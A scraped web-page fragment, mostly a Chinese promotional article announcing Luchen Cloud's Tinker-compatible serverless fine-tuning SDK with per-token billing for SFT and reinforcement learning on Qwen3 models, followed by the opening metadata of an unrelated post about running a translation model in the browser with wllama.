code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9dd8ab23d5d465288b42baf1cbfe6b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=%2FTQjmaHLrWribi538jxkjLeWu1E%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】当大模型竞争转向后训练，继续为闲置显卡烧钱无异于「慢性自杀」。如今，按 Token 计费的 Serverless 模式，彻底终结了算力租赁的暴利时代，让算法工程师真正拥有了定义物理世界的权利。」</strong></h5>
<p>大模型训练，正从「作坊炼丹」进化为「工业微调」！</p>
<p>当 OpenAI 前 CTO Mira Murati 创立的 Thinking Machines Lab 推出 Tinker 时，一切都变了。</p>
<p>通过将训练拆解为 forward、backward 等⼀系列基本原语，算法设计终于不再受限于基础设施。</p>
<p>现在，训练大模型就像「函数调用」一样简单。</p>
<p><strong>「紧跟前沿，潞晨云微调」</strong> <strong>「SDK」</strong> <strong>「正式发布！」</strong></p>
<p>这是国内首个兼容 Tinker 范式、且全面开放的 Serverless 微调平台。</p>
<p>针对复杂且昂贵的强化学习，给出了更具成本优势的工业级解法：</p>
<ul>
<li><strong>「零门槛」</strong>：开发者无需囤积显卡。</li>
<li><strong>「全透明」</strong>：Rollout → Reward → Update，全流程按 Token 计价。</li>
<li><strong>「极高效」</strong>：拒绝算力浪费，让每一分钱都花在产生梯度的「刀刃」上。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48375f98282545d4b431a1880032f182~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=Wn9NiNWm1DERDM9JlXv7NdXLUT4%3D" alt="" loading="lazy"/></p>
<p><strong>「拥抱后训练与 RL」</strong></p>
<p><strong>「算法层与底层算力架构的解耦」</strong></p>
<p>随着 OpenAI o1 在推理能力上的突破，业界逐渐形成共识：</p>
<p>大模型的能力突破已不再单纯依赖预训练（Pre-training）阶段的参数堆砌，后训练（Post-Training）特别是强化学习正成为决定模型实用价值的核心战场。</p>
<p>以 DeepSeek‑R1 为例，仅靠强化学习训练，模型在 AIME 数学推理基准上的 pass@1 从 15.6% 提升至 77.9%，充分展示了 RL 在低数据量条件下即可实现大幅能力跃升，迅速成为后训练赛道的新范式。</p>
<p>然而，摆在算法工程师面前的问题依旧严峻。</p>
<p>强化学习涉及到更为复杂的系统设计，训练过程中存在一系列的问题，如多个模型的优化，数据的传递，以及模型权重的传递；一系列工程化的工作，给算法的设计带来了更多的困难，同时也对基础设施提出了更高的要求。</p>
<p>Tinker 的出现，就是为了解决这个问题：<strong>「把繁杂训练变成标准易用的」</strong> <strong>「API」****。</strong></p>
<p>潞晨云把这一范式写进底层假设，<strong>「算法****设计与基础设施解耦」</strong>——</p>
<p>开发者只负责定义数据与 Loss 函数，底层的异构集群调度、并行策略优化、容错运维等应被封装为基础设施服务，对开发者实现全托管与无感支持。</p>
<p><strong>「致敬创新，更致力于</strong>「<strong>「落地」</strong>」<strong>。」</strong></p>
<p>潞晨云微调 SDK，直接兼容 Tinker 接口。</p>
<p>它在「零代码」与「裸机手写」之间，找到了最佳平衡点。从此，从算法灵感到模型落地，再无工程壁垒。</p>
<p>如今，开发者可以把研究精力和算力成本从集群运维还原至算法本身，感受「本地写码，云端计算」的**「训练即服务（Training as a Service）」<strong>「流畅体验」</strong>。**</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6a7b8f04ecf4ca6acfe388a597775ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=2K2P4dNau1aUVqSsJsYDV4kIN8c%3D" alt="" loading="lazy"/></p>
<p><strong>「颠覆性人效比」</strong></p>
<p><strong>「1 名算法工程师顶替庞大 Infra 团队」</strong></p>
<p><strong>「潞晨云微调」</strong> <strong>「SDK」</strong> <strong>「的核心思路可以概括为：</strong>「<strong>「算法」</strong>」<strong>工程师定义算法逻辑，潞晨云搞定 Infra。」</strong></p>
<p>在传统的开发中，用户往往要花大量精力去租赁合适的算力集群、管理环境配置、调训练框架和集群运维。</p>
<p>但潞晨云将大模型训练拆解成了一组标准的函数原语，打通了**「从 SFT 到 RL 的全链路」**：</p>
<ul>
<li>**Forward &amp; Backward：**处理前向传播与梯度计算</li>
<li>**Optimizer Step：**执行权重更新策略</li>
<li>**Sample (Rollout)：**做推理生成和评估，使用户不仅可以完成 SFT，更能轻松构建 PPO、GRPO、DPO 等复杂的强化学习（RLHF/RLAIF）训练流</li>
<li>**Save State：**管理模型检查点与状态保存</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f1b527f4166439592784c8ac7d1ed4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=KkkXABZRwxWpUVot%2F2B5yAxWcAo%3D" alt="" loading="lazy"/></p>
<p>这意味着，用户可以在本地熟悉的 Jupyter Notebook 或 IDE 里，用最标准的 Python 语法像搭积木一样自由组合，掌控训练逻辑的细节。</p>
<p>这种模式带来了颠覆性的「人力效能比」提升——</p>
<p>它将原本需要运维工程师、Infra 工程师、平台工程师和算法工程师紧密配合的庞大团队，简化为了「一个算法工程师」的独立闭环。</p>
<p>用户不再被底层繁杂的基建拖累，不再背负多职能的枷锁，也不再是黑盒填参的被动执行者，而是能够独立驾驭大规模训练流的主动设计师。</p>
<p>无论是监督微调（SFT）还是更复杂的强化学习（RL）Pipeline，都能通过组合这些原子函数来灵活构建。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26bb98f33470489186a6edb6ea015731~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=yGIld%2FRcaBvlgb5L4ZV6vilEyMM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0aa617ee5b9c4e5da10f9cf1f72ee3dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=Odrw2wGeeXouxd2kCuZ14RqVmoM%3D" alt="" loading="lazy"/></p>
<p><strong>「为什么这种体验如此丝滑？」</strong></p>
<p>为了实现极致的流畅度，潞晨云基于现有的 GPU 云服务架构实现了一套完整的后端系统。</p>
<p>在具体实现中，潞晨云采⽤控制⾯与计算⾯分离设计，通过统⼀ API Server 管理跨地域的多个 GPU 计算集群，实现多云部署能⼒。</p>
<p>核⼼采⽤基于 Future 模式的异步 API，所有训练操作⽀持⾮阻塞调⽤，⽤⼾⽆需等待 GPU 计算完成即可继续执⾏后续逻辑。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31b55b362630455b9d3e5fc6da05737e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=u%2FHs6YFLEk3LsIgeiu561HsFMV8%3D" alt="" loading="lazy"/></p>
<p>潞晨云微调 SDK 还具备智能队列系统。</p>
<p>即使在资源洪峰期，任务也会自动进入持久化队列（Persistence Queue），一旦底层资源可用，毫秒级启动：</p>
<ul>
<li>队列等待期间 0 计费</li>
<li>仅对实际 prefill + sample + train 的 Token 量收费</li>
</ul>
<p>彻底告别资源闲置浪费，让用户的每一分钱都用在产生梯度的刀刃上。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bd7dba619614e4da6ac3ab449c0af44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=EG2p88oGaTshifEw%2BcdDV10SvH0%3D" alt="" loading="lazy"/></p>
<p><strong>「模型微调算力零售革命」</strong></p>
<p><strong>「从包机租赁到按 Token 计费」</strong></p>
<p>如果说「易用性」是后训练平台的入场券，那么「成本结构」则是决定谁能走得更远的护城河。</p>
<p>在传统云主机的「包机 / 时租」模式中，用户一直在为「过程」买单——无论是在加载数据、调试代码，还是仅仅在思考 Loss 函数，只要占用了显卡，计费表就在跳动。</p>
<p>这种模式下，<strong>「开发过程中有一半以上的预算都浪费在了这些没有实际产出的「垃圾时间」里」</strong>。</p>
<p>潞晨云为微调大模型场景引入了 Serverless 架构，推行「按 Token 计费」的商业模式，将微调场景的算力服务切分到了最细的颗粒度：</p>
<ul>
<li>为价值付费</li>
</ul>
<p>就像使用推理 API 一样，用户只需为 Prefill（输入）、Sample（推理输出）和 Train（训练）产生的**「有效计算 Tokens 量」**付费。</p>
<ul>
<li>其他环节全免费</li>
</ul>
<p>本地代码调试、环境配置、数据预处理、模型 Checkpoint 保存…… 这些在传统租卡模式下分秒必争的环节，在潞晨云**「全部免费」**。</p>
<ul>
<li>极致性价比</li>
</ul>
<p>通常，RL 需要同时维护高吞吐的推理集群（vLLM）和训练集群，算力成本极高。</p>
<p>但在潞晨云上，实测基于官方 Cookbook 的 math_rl recipe 跑通包含 Rollout 采样、Reward 评分和 PPO 更新的**「完整 RL 流程」<strong>（~300 steps），总算力成本</strong>「仅 8.61 元」**。</p>
<p>这意味着，个体开发者也能低成本复现 RLHF/RLAIF 探索。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8c0ed485aa34846bfba37b306f4993d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=PVn%2FILiFDLuYrAg3GbCelHyQO5o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09de642f94dd48408c61a80ecc914dba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=om2Prw1Qp%2BSPawA%2FM%2ByhFSW34vQ%3D" alt="" loading="lazy"/></p>
<p><strong>「技术落地的三个场景」</strong></p>
<p><strong>「SFT 与 RL 同时开箱即用」</strong></p>
<p>这种新模式，也将彻底改变不同领域开发者的工作流：</p>
<ul>
<li>科研场景：告别资源焦虑</li>
</ul>
<p>学术界，时间与算力往往是最紧缺的资源。研究人员不仅要面对繁琐的集群运维（Slurm/Docker 配置），还要应对昂贵的实验复现成本。</p>
<p>潞晨云微调 SDK 支持「白盒级」的科研探索，全面兼容 Tinker API。</p>
<p>研究人员可以自定义 Evaluation 逻辑、通过 Forward/Backward，Sample 等原语精确控制后训练和强化学习 Pipeline，而无需关心底层的分布式实现，让实验复现成本大幅降低。</p>
<ul>
<li><strong>「创业与独立开发：极速验证」</strong> <strong>「MVP」</strong></li>
</ul>
<p>对于初创团队，「快」是生存根本。利用潞晨云微调 SDK 的 Serverless 特性，开发者无需等待资源排期。</p>
<p>配合极低的 Token 成本，实测从 pip install 到跑通一个包含 1000 条样本的 SFT 或 RL 微调实验，仅需数分钟。</p>
<p>这种极致的边际成本，让创业者敢于在有限预算下快速迭代 Reward 模型，实现真正的「低成本试错」。</p>
<ul>
<li><strong>「工业级</strong>「<strong>「落地」</strong>」<strong>：复杂架构突围」</strong></li>
</ul>
<p>在金融、医疗等垂直领域的工业应用中，已有微调 API 往往难以应对复杂的异构架构与 RLHF/RLAIF 需求。</p>
<p>潞晨云微调 SDK 允许工程师通过 train_step 自由定义 Loss 逻辑与强化学习奖励函数。</p>
<p>开发者拥有对模型权重与训练细节的完整控制权**，**实现端到端定制。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db00c9a2bc274aaab3ea809b8319b7d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=6jqglOtmgD4h8tfBVZCSD5Jm6XQ%3D" alt="" loading="lazy"/></p>
<p><strong>「极简实战」</strong></p>
<p><strong>「三步上手」</strong></p>
<p>没有复杂的集群配置，没有冗长的 Docker 构建。</p>
<p>使用潞晨云微调 SDK，训练一个大模型就像写普通 Python 脚本一样简单：</p>
<ol>
<li>Install &amp; Import:</li>
</ol>

<pre><code class="hljs">pip install hpcai
</code></pre>
<p>2.  Initialize Client：</p>
<p>目前已支持 Qwen3 系列（4B - 32B），更多模型即将上线。</p>
<ol start="3">
<li>Define Training Loop &amp; Run：</li>
</ol>
<p>像在本地写 PyTorch 一样，拥有对训练循环的完整控制权。</p>
<p>⽬前，微调 SDK 已覆盖 Qwen3 系列模型（4B、8B、14B、32B），支持监督学习和强化学习训练方式，并将持续扩展更多模型能力与细分落地场景，大家也可以向官方提交需求 push 更新。</p>
<p><strong>「平台还准备了开箱即用的 HPC-AI Cookbook」</strong>，提供包括 <strong>「DeepSeek-R1 GRPO」</strong> <strong>「算法」</strong>、<strong>「基于 Verifier 的数学推理」</strong>、**「自定义 Reward 函数」**等复杂 RL 场景的完整代码实现。</p>
<p>开发者无需从零构建复杂的 PPO/GRPO 流水线，只需复制 Cookbook 中的「配方」，<strong>「运行轻量级本地」</strong> <strong>「train.py」</strong> **脚本，即可驱动云端复杂的分布式 RL 训练流，**在潞晨云上复现具备复杂逻辑推理能力的 SOTA 模型。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53e88a38c10544e2ba44aea4ca8a0ca3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=ygW9y83oWEZucwQy1qW%2FHaJA89s%3D" alt="" loading="lazy"/></p>
<p><strong>「现在体验」</strong></p>
<p>后训练正从学术支线升级为工程主线，AI 基础设施的终极形态应该是「零认知负荷」——</p>
<p>开发者只需描述数据与算法，其余（租卡、配环境、并行策略、运维调度、故障自愈，乃至 RL 涉及的一系列工程化的工作）全部下沉到用户无感。</p>
<p>当 GPU 闲置成本趋近于 0，环境配置时间趋近于 0，长序列 RLHF 也能按 Token 即时计费，应用创新效率直接逼近算力上限。</p>
<p>潞晨云微调 SDK 今日起全量开放：</p>
<ul>
<li>无需白名单，无需预约</li>
<li>前 150 名专属链接注册即得 30 元使用额度（可点击【阅读原文】跳转）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.luchentech.com%2Faccount%2Fsignup%3Finvitation_code%3DXZY" target="_blank" title="https://cloud.luchentech.com/account/signup?invitation_code=XZY" ref="nofollow noopener noreferrer">cloud.luchentech.com/account/sig…</a></li>
</ul>
<p>把资源弹性交给平台，把算法自由度留给自己，每一分钱都用在产生梯度的刀刃上！</p>
<p>立即体验：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.luchentech.com%2Ffine-tuning" target="_blank" title="https://cloud.luchentech.com/fine-tuning" ref="nofollow noopener noreferrer">cloud.luchentech.com/fine-tuning</a></p>
<p>使用文档：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.luchentech.com%2Fdoc%2Fdocs%2Ffinetune-sdk%2F" target="_blank" title="https://cloud.luchentech.com/doc/docs/finetune-sdk/" ref="nofollow noopener noreferrer">cloud.luchentech.com/doc/docs/fi…</a></p>
<p>Tinker SDK：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fthinking-machines-lab%2Ftinker" target="_blank" title="https://github.com/thinking-machines-lab/tinker" ref="nofollow noopener noreferrer">github.com/thinking-ma…</a></p>
<p>DeepSeek-R1：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2501.12948" target="_blank" title="https://arxiv.org/pdf/2501.12948" ref="nofollow noopener noreferrer">arxiv.org/pdf/2501.12…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[wllama]纯前端实现大语言模型调用：在浏览器里跑 AI 是什么体验。以调用腾讯 HY-MT1.5 混元翻译模型为例]]></title>    <link>https://juejin.cn/post/7592803747471540274</link>    <guid>https://juejin.cn/post/7592803747471540274</guid>    <pubDate>2026-01-08T10:49:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592803747471540274" data-draft-id="7592803747471458354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[wllama]纯前端实现大语言模型调用：在浏览器里跑 AI 是什么体验。以调用腾讯 HY-MT1.5 混元翻译模型为例"/> <meta itemprop="keywords" content="前端,AIGC,AI编程"/> <meta itemprop="datePublished" content="2026-01-08T10:49:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Electrolux"/> <meta itemprop="url" content="https://juejin.cn/user/3004311888208296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [wllama]纯前端实现大语言模型调用：在浏览器里跑 AI 是什么体验。以调用腾讯 HY-MT1.5 混元翻译模型为例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3004311888208296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Electrolux
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:49:15.000Z" title="Thu Jan 08 2026 10:49:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 